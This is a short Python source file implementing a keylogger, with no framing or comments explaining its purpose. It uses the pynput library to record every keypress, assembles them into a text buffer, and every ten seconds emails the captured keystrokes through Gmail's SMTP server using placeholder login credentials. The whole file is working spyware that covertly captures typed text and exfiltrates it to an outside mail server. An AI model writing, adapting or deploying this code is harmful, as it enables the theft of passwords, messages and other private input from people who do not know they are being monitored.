import pynput
import subprocess
import threading
import smtplib
class Key:
    def __init__(self):
        self.l=""
        self.spl=""

    def add(self,key):
        try:
            self.l+=str(key.char)
        except:
            if key==key.space:
                self.l=self.l+" "
            elif key==key.tab:
                self.l=self.l+"\t"
            elif key==key.backspace:
                self.l=self.l[:-1]
            else:
                self.spl+=str(key)
    def report(self):
        server=smtplib.SMTP("smtp.gmail.com",587)
        server.starttls()
        email,password="gmail_username","password"
        server.login(email,password)
        server.sendmail(email,email,"\n\n"+self.l)
        server.quit()
        #print(self.l)
        t=threading.Timer(10,self.report)
        t.start()
    def process(self,key):
        self.add(key)
        #print(self.l)
    def start(self):
        k=pynput.keyboard.Listener(on_press=self.process)
        with k:
            self.report()
            k.join()
